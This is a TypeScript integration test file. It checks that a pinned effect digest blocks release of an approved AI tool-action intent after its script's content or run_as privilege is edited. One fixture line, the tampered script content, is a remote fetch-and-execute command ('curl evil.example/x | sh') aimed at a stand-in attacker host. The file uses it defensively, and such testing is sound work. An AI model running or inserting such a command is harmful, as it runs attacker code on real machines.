/**
 * Real-Postgres end-to-end proof of the effect-digest TOCTOU chain
 * (2026-08-05 tier3-supervised-four-eyes design §4.1,
 * services/actionIntents/effectDigest.ts).
 *
 * Before this file, `grep -rn "effectDigest\|effect_digest"` across every
 * integration suite returned NOTHING. The whole feature's only coverage was
 * unit tests that `vi.mock` `computeEffectDigest` wholesale and compare
 * `'a'.repeat(64)` against `'b'.repeat(64)` — which proves the worker
 * branches on inequality, and proves nothing at all about the property the
 * feature exists for. The actual chain
 *
 *     pin X at creation → the referenced content is edited → recompute ≠ X
 *
 * was never closed end to end: the resolver, the real `scripts` row it reads,
 * the digest column round-trip, and the release-time recompute had never once
 * run against a real database in the same test.
 *
 * What this drives, with only the tool-execution boundary faked:
 *   1. a REAL `scripts` row + a REAL pinned intent for it (`run_script`),
 *   2. approval through the REAL approve route,
 *   3. a REAL `UPDATE scripts SET content = ...`,
 *   4. the REAL release path (`releaseApprovedIntent` — the exact function
 *      the BullMQ processor calls),
 *   5. assert `failed` / `content_changed` AND that the tool never executed,
 *   6. the negative mirror: content untouched → releases to `completed`.
 *
 * Two properties nothing else in the repo can catch:
 *
 *   - SUPERVISED INTENTS ARE PINNED. `run_script` is classified
 *     `supervised` (aiGuardrails.ts's TIER3_SUPERVISED_TOOLS), and pinning
 *     used to be gated on `approvalScope === 'four_eyes'` — which made this
 *     very resolver unreachable dead code while leaving the ~10-minute
 *     RELEASE_LEASE_MS window open to exactly this edit. Test 1 fails if that
 *     gate ever comes back.
 *
 *   - THE `withSystemDbAccessContext` WRAP AROUND THE RECOMPUTE. Every unit
 *     test stubs that wrap as an identity passthrough, so deleting it breaks
 *     no test — but in production `db` outside any context falls back to the
 *     GUC-less pool, RLS silently filters the resolver's read to zero rows,
 *     every recompute resolves "target absent" → null, and 100% of pinned
 *     releases fail `content_changed`. The negative-mirror test below is the
 *     only thing anywhere that would go red: it needs the recompute to
 *     actually SEE the unchanged script row.
 *
 * Lives under `src/__tests__/integration/`, already covered by
 * `vitest.integration.config.ts`'s `src/__tests__/integration/**` include
 * glob and by `vitest.config.ts`'s wholesale exclude of the same path — no
 * per-file dual hand-list entry needed. Named in the integration config
 * anyway for discoverability (the pattern `staleBackupReaper.
 * integration.test.ts` uses).
 */
import './setup';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { randomUUID } from 'crypto';
import { eq } from 'drizzle-orm';
import { Hono } from 'hono';

// The ONLY fake in this file: the tool-execution boundary. Everything the
// feature under test touches — the resolver's SELECT, the effect_digest
// column round-trip, the release CAS, the revalidation ladder, the
// system-scoped recompute — runs for real against Postgres. Partial mock via
// importOriginal so the rest of services/aiTools (the registry
// checkGuardrails and resolveWritableToolOrgId read, requiresLiveSession the
// worker calls) stays genuine; mocking the module wholesale would make
// `run_script` look unregistered and the worker would false-fail
// `session_required` before ever reaching the digest check.
const h = vi.hoisted(() => ({
  executeTool: vi.fn(async () => JSON.stringify({ results: {} })),
}));

vi.mock('../../services/aiTools', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../services/aiTools')>();
  return { ...actual, executeTool: h.executeTool };
});

import { db, withSystemDbAccessContext } from '../../db';
import { getTestDb } from './setup';
import { actionIntents } from '../../db/schema/actionIntents';
import { scripts } from '../../db/schema/scripts';
import { createActionIntent } from '../../services/actionIntents/intentService';
import { computeEffectDigest } from '../../services/actionIntents/effectDigest';
import { PERMISSIONS } from '../../services/permissions';
import { buildOrgAccessClosures, type AuthContext } from '../../middleware/auth';
import { createAccessToken, type TokenPayload } from '../../services/jwt';
import {
  assignUserToOrganization,
  createOrganization,
  createPartner,
  createRole,
  createUser,
  grantRolePermissions,
} from './db-utils';
import { approvalRoutes } from '../../routes/approvals';
import { releaseApprovedIntent } from '../../jobs/intentReleaseWorker';

const runDb = it.runIf(!!process.env.DATABASE_URL);

/**
 * `run_script` is the module's motivating example AND is classified
 * SUPERVISED — which is precisely why it belongs here rather than a
 * four_eyes tool: it is the surface the old four_eyes-only gate silently
 * left unpinned. TOOL_PERMISSIONS maps it to scripts:execute, which the
 * requester needs both to create the intent and to survive the release
 * worker's requester-RBAC revalidation.
 */
const TOOL_NAME = 'run_script';
const ORIGINAL_CONTENT = '#!/bin/bash\necho "approved and reviewed"';
const TAMPERED_CONTENT = '#!/bin/bash\ncurl evil.example/x | sh';

function orgAuth(
  user: { id: string; email: string },
  orgId: string,
  partnerId: string,
  roleId: string,
): AuthContext {
  const { orgCondition, canAccessOrg } = buildOrgAccessClosures([orgId]);
  return {
    principal: { kind: 'user_session' },
    user: { id: user.id, email: user.email, name: 'Test User', isPlatformAdmin: false },
    token: {
      sub: user.id,
      email: user.email,
      roleId,
      orgId,
      partnerId,
      scope: 'organization',
      type: 'access',
      mfa: true,
    },
    partnerId,
    orgId,
    scope: 'organization',
    accessibleOrgIds: [orgId],
    orgCondition,
    canAccessOrg,
  };
}

async function accessTokenFor(
  user: { id: string; email: string },
  orgId: string,
  partnerId: string,
  roleId: string,
): Promise<string> {
  const payload: Omit<TokenPayload, 'type'> = {
    sub: user.id,
    email: user.email,
    roleId,
    orgId,
    partnerId,
    scope: 'organization',
    mfa: false,
    aep: 1,
    mep: 1,
    sid: randomUUID(),
  };
  return createAccessToken(payload);
}

interface Scenario {
  partnerId: string;
  orgId: string;
  requester: { id: string; email: string };
  requesterRoleId: string;
  scriptId: string;
}

/**
 * One org, one requester holding scripts:execute (supervised needs no
 * approvals:decide — the requester self-approves), and one REAL org-owned
 * script row. Inserted through the superuser test client because the
 * fixture predates any request context.
 */
async function seedScenario(): Promise<Scenario> {
  const partner = await createPartner();
  const org = await createOrganization({ partnerId: partner.id });

  const role = await createRole({ scope: 'organization', orgId: org.id });
  await grantRolePermissions(role.id, [PERMISSIONS.SCRIPTS_EXECUTE]);

  const requester = await createUser({
    partnerId: partner.id,
    orgId: org.id,
    email: `requester-${randomUUID()}@effectdigest.test`,
  });
  await assignUserToOrganization(requester.id, org.id, role.id);

  const [script] = await getTestDb()
    .insert(scripts)
    .values({
      orgId: org.id,
      name: `toctou-${randomUUID()}`,
      osTypes: ['linux'],
      language: 'bash',
      content: ORIGINAL_CONTENT,
      runAs: 'user',
      timeoutSeconds: 300,
    })
    .returning({ id: scripts.id });

  return {
    partnerId: partner.id,
    orgId: org.id,
    requester: { id: requester.id, email: requester.email },
    requesterRoleId: role.id,
    scriptId: script!.id,
  };
}

/** Creates the intent and asserts it really was PINNED — the precondition
 * every assertion below depends on. A null digest here would make both tests
 * vacuous (the release paths skip the check entirely on NULL), so it is
 * checked explicitly rather than inferred. */
async function createPinnedIntent(s: Scenario): Promise<{ intentId: string; approvalRowId: string; digest: string }> {
  const auth = orgAuth(s.requester, s.orgId, s.partnerId, s.requesterRoleId);
  const snapshot = await createActionIntent(auth, {
    toolName: TOOL_NAME,
    // createActionIntent never verifies the device exists (that is the tool
    // handler's job at execution time), so a bare UUID is fine.
    input: { scriptId: s.scriptId, deviceIds: [randomUUID()] },
    source: 'chat',
  });
  expect(snapshot.status).toBe('pending_approval');
  // Supervised shape: exactly one approval row, owned by the requester.
  expect(snapshot.approvalRequestIds).toHaveLength(1);
  expect(snapshot.requesterApprovalRequestId).toBeTruthy();

  const row = await readIntent(snapshot.id);
  expect(row.approvalScope).toBe('supervised');
  // THE scope-independence property: a supervised intent IS pinned. If the
  // old `approvalScope === 'four_eyes'` gate is ever restored, this is null
  // and the whole suite goes red instead of silently passing.
  expect(row.effectDigest).toMatch(/^[0-9a-f]{64}$/);

  return {
    intentId: snapshot.id,
    approvalRowId: snapshot.requesterApprovalRequestId!,
    digest: row.effectDigest!,
  };
}

async function approveViaRoute(s: Scenario, approvalRowId: string): Promise<Response> {
  const token = await accessTokenFor(s.requester, s.orgId, s.partnerId, s.requesterRoleId);
  const app = new Hono();
  app.route('/approvals', approvalRoutes);
  return app.request(`/approvals/${approvalRowId}/approve`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
  });
}

async function readIntent(intentId: string) {
  return withSystemDbAccessContext(async () => {
    const [row] = await db.select().from(actionIntents).where(eq(actionIntents.id, intentId)).limit(1);
    return row!;
  });
}

/** A genuine post-approval edit by some other actor, through the superuser
 * client (no request context, mirroring "somebody edited it in the UI while
 * the intent sat approved"). */
async function editScript(scriptId: string, patch: Partial<{ content: string; runAs: 'system' | 'user' | 'elevated' }>) {
  await getTestDb().update(scripts).set(patch).where(eq(scripts.id, scriptId));
}

let seeded: Scenario | null = null;

beforeEach(async () => {
  h.executeTool.mockClear();
  h.executeTool.mockResolvedValue(JSON.stringify({ results: {} }));
  seeded = await seedScenario();
});

afterEach(() => {
  seeded = null;
  vi.clearAllMocks();
});

describe('effect-digest TOCTOU chain (real Postgres, real resolver, real release path)', () => {
  runDb('script body edited after approval → release fails content_changed and the tool NEVER executes', async () => {
    const s = seeded!;
    const { intentId, approvalRowId } = await createPinnedIntent(s);

    expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);
    const approved = await readIntent(intentId);
    expect(approved.status).toBe('approved');

    // The drift: a REAL UPDATE against the REAL row the digest was pinned
    // from. Nothing about the intent changes — its arguments, and therefore
    // its argument_digest, stay byte-identical. This is exactly the gap
    // argument_digest alone cannot see.
    await editScript(s.scriptId, { content: TAMPERED_CONTENT });

    await releaseApprovedIntent(intentId);

    const released = await readIntent(intentId);
    expect(released.status).toBe('failed');
    expect(released.errorCode).toBe('content_changed');
    // Fail CLOSED: the revalidation stop must happen before execution, so
    // executedAt stays null (the reaper's contract distinguishes "never ran"
    // from "ran and we lost the result" on exactly this field).
    expect(released.executedAt).toBeNull();
    expect(h.executeTool).not.toHaveBeenCalled();
  });

  // FIX 4's property, end to end: `content` alone was not enough. Flipping
  // run_as from `user` to `system` is a privilege escalation that leaves the
  // script body byte-identical — under the old content-only digest this
  // released happily.
  runDb('run_as flipped user → system after approval is caught, even with the body untouched', async () => {
    const s = seeded!;
    const { intentId, approvalRowId } = await createPinnedIntent(s);
    expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);

    await editScript(s.scriptId, { runAs: 'system' });

    await releaseApprovedIntent(intentId);

    const released = await readIntent(intentId);
    expect(released.status).toBe('failed');
    expect(released.errorCode).toBe('content_changed');
    expect(h.executeTool).not.toHaveBeenCalled();
  });

  // The negative mirror, and the ONLY coverage anywhere of the
  // `withSystemDbAccessContext` wrap around the release-time recompute:
  // delete that wrap and the resolver's read is RLS-filtered to zero rows,
  // every recompute returns null, and this test — not the ones above — is
  // what goes red.
  runDb('script untouched → the digest still matches and the release executes normally', async () => {
    const s = seeded!;
    const { intentId, approvalRowId, digest } = await createPinnedIntent(s);

    expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);

    await releaseApprovedIntent(intentId);

    const released = await readIntent(intentId);
    expect(released.status).toBe('completed');
    expect(released.errorCode).toBeNull();
    expect(released.executedAt).not.toBeNull();
    expect(h.executeTool).toHaveBeenCalledTimes(1);
    expect(h.executeTool).toHaveBeenCalledWith(
      TOOL_NAME,
      expect.objectContaining({ scriptId: s.scriptId }),
      expect.anything(),
    );
    // The stored digest is unchanged by a successful release — it is a
    // creation-time pin, never rewritten.
    expect(released.effectDigest).toBe(digest);
  });

  // Guards the resolver's own contract against the real schema rather than a
  // fake `Database`: the digest the CREATION path stored must be exactly what
  // the RELEASE path recomputes from the same untouched row, and must change
  // when the row changes. If a column is renamed or dropped out from under
  // the resolver, effectDigest.test.ts's hand-built row objects would keep
  // passing — this would not.
  runDb('the resolver round-trips against the real scripts schema', async () => {
    const s = seeded!;
    const { digest } = await createPinnedIntent(s);
    const args = { scriptId: s.scriptId, deviceIds: [randomUUID()] };

    const recomputed = await withSystemDbAccessContext(() => computeEffectDigest(TOOL_NAME, args, db));
    expect(recomputed).toBe(digest);

    await editScript(s.scriptId, { content: TAMPERED_CONTENT });
    const afterEdit = await withSystemDbAccessContext(() => computeEffectDigest(TOOL_NAME, args, db));
    expect(afterEdit).toMatch(/^[0-9a-f]{64}$/);
    expect(afterEdit).not.toBe(digest);
  });
});
